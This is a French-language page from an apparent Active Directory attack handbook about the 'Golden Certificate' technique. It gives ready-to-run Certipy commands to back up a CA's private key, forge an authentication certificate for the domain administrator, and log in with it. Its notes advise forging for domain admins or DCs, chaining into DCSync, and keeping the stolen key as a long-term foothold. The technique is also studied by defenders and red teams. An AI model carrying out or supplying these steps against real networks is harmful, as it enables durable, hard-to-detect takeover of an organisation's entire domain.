---
order: 8
title: "Golden Certificate : forger avec la clé privée de la CA"
description: "Voler la clé privée d'une CA d'entreprise et l'utiliser pour forger hors ligne des certificats d'authentification client pour n'importe quel principal, une primitive de persistance à l'échelle du domaine et de longue durée, analogue à un golden ticket mais pour AD CS."
keywords:
  - golden certificate
  - clé privée de la CA
  - forger
  - Certipy
  - persistance
---

# Golden Certificate

Une fois que vous détenez le rôle d'**administrateur local sur le serveur CA**, vous pouvez voler la **clé privée** de la CA elle-même. Avec cette clé, vous signez des **certificats d'authentification client arbitraires** pour n'importe quel principal, entièrement hors ligne, et le domaine leur fait confiance car la CA qui les a émis figure dans le magasin NTAuth. C'est l'équivalent certificat d'un [golden ticket](../kerberos/forged-tickets.md) : non pas une escalade unique mais une **usurpation durable, à l'échelle du domaine** qui survit aux réinitialisations de mot de passe et dure jusqu'à l'expiration du certificat de la CA lui-même.

## Voler la clé et forger

```bash
# 1. Back up the CA certificate and private key (needs local admin on the CA host)
certipy ca -backup -ca 'EXAMPLE-CA' -u user@example.local -p <password> -target ca.example.local

# 2. Forge a certificate for any principal, signed by the stolen CA key, offline.
#    -sid gives the strong SID binding that Full Enforcement requires; -crl supplies a CDP the KDC wants
certipy forge -ca-pfx EXAMPLE-CA.pfx -upn administrator@example.local \
  -sid <administrator-SID> -crl 'ldap:///' -out administrator_forged.pfx

# 3. Authenticate with the forged certificate
certipy auth -pfx administrator_forged.pfx -dc-ip <dc>
```

## Notes d'exploitation

- Le certificat forgé ne nécessite **aucune interaction avec la CA** après le vol de la clé, il est donc invisible pour le pipeline d'émission et fonctionne tant que le certificat de la CA est valide (souvent des années).
- C'est de la **persistance**, pas seulement de l'escalade : reforger pour n'importe quel utilisateur à tout moment, y compris après que la cible a changé son mot de passe, en fait donc un point d'ancrage de long terme privilégié une fois une CA compromise.
- Forgez pour un **administrateur de domaine ou un DC** et associez au [pass-the-certificate](theft-and-pass-the-certificate.md) ou à [Schannel](schannel.md) pour vous authentifier, puis DCSync.
- Cela découle naturellement de la prise de contrôle de la CA via l'abus de [configuration de la CA](ca-configuration.md) ou de [contrôle d'accès](access-control.md), traitez donc la compromission d'un serveur CA comme un signal pour récupérer la clé à des fins de persistance.

## Outils

- **Certipy** (`ca -backup`, `forge`, `auth`) : extraire la clé de la CA et forger des certificats.
- **ForgeCert** (GhostPack) : forger un certificat à partir d'un PFX de CA volé.

## Références

- [SpecterOps: Certified Pre-Owned (DPERSIST domain persistence)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [Certipy wiki: post-exploitation, golden certificates](https://github.com/ly4k/Certipy/wiki/07-%E2%80%90-Post%E2%80%90Exploitation)
- [The Hacker Recipes: golden certificate](https://www.thehacker.recipes/ad/persistence/adcs/golden-certificate)
